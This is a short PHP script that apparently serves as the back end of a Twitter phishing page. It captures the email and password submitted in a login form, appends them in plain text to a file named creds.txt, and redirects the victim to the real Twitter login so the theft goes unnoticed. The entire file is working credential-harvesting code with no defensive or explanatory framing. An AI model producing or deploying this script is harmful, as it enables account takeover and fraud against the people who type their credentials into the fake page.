<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Capture email and password
    $email = isset($_POST['email']) ? $_POST['email'] : 'No Email';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : 'No Password';

    // Save into creds.txt
    $data = "Email/Username: " . $email . "\nPassword: " . $pass . "\n-------------------------\n";
    file_put_contents('creds.txt', $data, FILE_APPEND);

    // Redirect to real Twitter login page
    header('Location: https://twitter.com/login');
    exit();
}
?>
